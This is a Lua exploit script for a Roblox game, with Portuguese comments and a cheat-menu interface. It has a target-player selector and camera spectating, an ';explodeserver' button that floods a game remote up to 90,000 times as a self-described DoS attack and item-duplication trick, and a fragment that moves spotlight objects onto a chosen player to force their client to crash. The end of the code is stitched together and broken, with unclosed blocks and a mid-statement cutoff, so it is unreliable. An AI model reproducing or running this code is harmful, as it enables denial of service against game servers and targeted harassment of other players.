-- ============================================================
-- 1. SISTEMA DO DROPDOWN AUTOMÁTICO (WINDUI)
-- ==========================================================
local AlvoSelecionado = ""

-- Função modificada para obter a lista de jogadores atuais
local function obterListaJogadores()
    local lista = {}
    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
        if p ~= game:GetService("Players").LocalPlayer then
            table.insert(lista, p.Name)
        end
    end
    return lista
end

-- ============================================================
-- 1. SELEÇÃO DE ALVO (Dropdown Nativo da WindUI)
-- ============================================================
local DropdownAlvos = MainTab:Dropdown({
    Title = "Selecionar Alvo",
    Values = obterListaJogadores(),
    Value = "", -- Começa sem nenhum alvo pré-definido
    Callback = function(OpcaoSelecionada)
        -- Normaliza o retorno caso a interface retorne uma tabela de seleção múltipla
        if type(OpcaoSelecionada) == "table" then
            AlvoSelecionado = OpcaoSelecionada[1] or ""
        else
            AlvoSelecionado = OpcaoSelecionada or ""
        end
        print("Alvo atual definido para: " .. tostring(AlvoSelecionado))
    end
})

-- Função automatizada para sincronizar a lista interna com o componente visual
local function atualizarDropdown()
    local novaLista = obterListaJogadores()
    DropdownAlvos:Refresh(novaLista) -- Método nativo suportado pela WindUI
end

-- Conexões de eventos para atualizar a lista dinamicamente
game:GetService("Players").PlayerAdded:Connect(function()
    task.wait(0.5)
    atualizarDropdown()
end)

game:GetService("Players").PlayerRemoving:Connect(function(player)
    if AlvoSelecionado == player.Name then
        AlvoSelecionado = ""
    end
    atualizarDropdown()
end)

MainTab:Button({
    Title = ";view",
    Callback = function()
        if AlvoSelecionado ~= "" then
            local Players = game:GetService("Players")
            local targetPlayer = nil
            
            -- Busca o jogador alvo pelo nome ou Nick no Dropdown
            for _, player in pairs(Players:GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(AlvoSelecionado)) or string.find(string.lower(player.DisplayName), string.lower(AlvoSelecionado)) then
                    targetPlayer = player
                    break
                end
            end
            
            if targetPlayer then
                local camera = workspace.CurrentCamera
                
                -- Se já houver um monitoramento ativo de View, desliga ele antes de iniciar o novo
                if _G.ViewConnection then 
                    _G.ViewConnection:Disconnect() 
                    _G.ViewConnection = nil
                end
                
                -- Função interna para focar a câmera no personagem atual
                local function focarNoAlvo(character)
                    if character then
                        local humanoid = character:WaitForChild("Humanoid", 5)
                        if humanoid then
                            camera.CameraSubject = humanoid
                        end
                    end
                end
                
                -- 1. Foca imediatamente no corpo atual do alvo se ele estiver vivo
                if targetPlayer.Character then
                    focarNoAlvo(targetPlayer.Character)
                end
                
                -- 2. 🔄 O SEGREDO: Cria o ouvinte persistente. Sempre que ele renascer, re-foca a câmera automaticamente
                _G.ViewConnection = targetPlayer.CharacterAdded:Connect(function(newCharacter)
                    focarNoAlvo(newCharacter)
                end)
                
                WindUI:Notify({
                    Title = "🎥 Câmera Ativa",
                    Content = "Assistindo " .. targetPlayer.Name .. ". O foco persistirá mesmo se ele renascer.",
                    Duration = 3
                })
                
                -- Se o alvo sair do servidor, limpa a conexão para economizar memória
                targetPlayer.AncestryChanged:Connect(function(_, parent)
                    if not parent and _G.ViewConnection then
                        _G.ViewConnection:Disconnect()
                        _G.ViewConnection = nil
                    end
                end)
            else
                WindUI:Notify({Title = "❌ Erro", Content = "Jogador não encontrado.", Duration = 3})
            end
        else
            WindUI:Notify({Title = "⚠️ Aviso", Content = "Por favor, selecione um alvo primeiro no Dropdown!", Duration = 4})
        end
    end
})

MainTab:Button({
    Title = ";explodeserver",
    Callback = function()
        local player = game:GetService("Players").LocalPlayer
        if not player then return end
        local replicatedStorage = game:GetService("ReplicatedStorage")

        local character = player.Character or player.CharacterAdded:Wait()
        local rootpart = character:WaitForChild("HumanoidRootPart", 10)
        if not rootpart then 
            WindUI:Notify({ Title = "Erro", Content = "HumanoidRootPart não encontrado.", Duration = 5 })
            return 
        end
        local oldcf = rootpart.CFrame

        local re = replicatedStorage:FindFirstChild("RE")
        local toolRemote = re and re:FindFirstChild("1Too1l")

        if not toolRemote then 
            WindUI:Notify({ Title = "Erro", Content = "Remote funcional não encontrado.", Duration = 5 })
            return 
        end

        WindUI:Notify({ Title = "Ataque DoS Iniciado", Content = "Derrubando o servidor, aguarde os jogadores crasharem...", Duration = 5 })

        task.spawn(function()
            for m = 1, 90000 do
                task.spawn(function()
                    if toolRemote:IsA("RemoteFunction") then
                        toolRemote:InvokeServer("PickingTools", "FireHose")
                    else
                        toolRemote:FireServer("PickingTools", "FireHose")
                    end
                end)

                local backpack = player:FindFirstChild("Backpack")
                if backpack then
                    local fireHose = backpack:FindFirstChild("FireHose")
                    if fireHose and fireHose:FindFirstChild("ToolSound") then
                        fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                    end
                end
                if m % 15 == 0 then task.wait() end
            end
        end)

        task.wait(0.4)
        player.CharacterRemoving:Wait()
        local newCharacter = player.CharacterAdded:Wait()
        local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
        local humanoid = newCharacter:WaitForChild("Humanoid", 15)

        if newRootPart and humanoid then
            task.wait(0.7)
            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
            newRootPart.CFrame = oldcf
            newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end

        WindUI:Notify({ Title = "Script de Dupe", Content = "Concluído! Equipando itens gerados...", Duration = 5 })
        task.wait(0.5)

        local backpack = player:WaitForChild("Backpack", 10)
        if backpack then
            local items = backpack:GetChildren()
            local equipCount = 0
            for i = 1, #items do
                local item = items[i]
                if item:IsA("Tool") and item.Name == "FireHose" then
                    equipCount = equipCount + 1
                    task.defer(function() item.Parent = newCharacter end)
                    if equipCount % 8 == 0 then task.wait(0.02) end 
                end
            end
        end
        task.wait(0.5)
        WindUI:Notify({ Title = "Script de Dupe", Content = "Processo finalizado com sucesso.", Duration = 5 })
    end

        if not pastaPostes then
            WindUI:Notify({Title = "❌ Erro Admin", Content = "Pasta de Holofotes não mapeada.", Duration = 3})

        end

            Title = "🛡️ Painel Admin",

            Duration = 3
        })

        local character = targetPlayer.Character
        -- Rastreia a base dos pés (HumanoidRootPart) para garantir que a luz estoure diretamente no chão abaixo dele
        local targetHRP = character:FindFirstChild("HumanoidRootPart")
        local postes = pastaPostes:GetChildren()
        
        if targetHRP and #postes > 0 then
            task.spawn(function()
                pcall(function()
                    -- Roda os ciclos assíncronos rápidos para forçar o fechamento do Roblox do alvo
                    for loop = 1, 12 do
                        if not targetPlayer or not targetPlayer.Parent then break end
                        
                        for i, poste in pairs(postes) do
                            local setCFrameRemote = poste:FindFirstChild("SetCurrentCFrame")
                            if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
                                
                                task.spawn(function()
                                    pcall(function()
                                        -- MATEMÁTICA DE PROJEÇÃO VERTICAL (Foco no Chão):
                                        -- Posiciona a fusão física dos postes 8 studs acima do plano do chão do alvo
                                        local posicaoSuperiorPoste = targetHRP.Position + Vector3.new(0, 8, 0)
                                        
                                        -- Busca automática e profunda pela parte "Lights"
                                        local parteDaLuz = poste:FindFirstChild("Lights", true)
                                        
                                        local destinoFinal
                                        if parteDaLuz and parteDaLuz:IsA("BasePart") then
                                            -- Desconta a distância interna da cabeça do holofote para que a lâmpada fique exatamente a 8 studs de altura
                                            local offsetInterno = parteDaLuz.Position - poste:GetPivot().Position
                                            local posicaoAjustada = posicaoSuperiorPoste - offsetInterno
                                            
                                            -- Força a rotação lookAt a mirar 100% para o chão sob os pés do alvo
                                            destinoFinal = CFrame.lookAt(posicaoAjustada, targetHRP.Position)
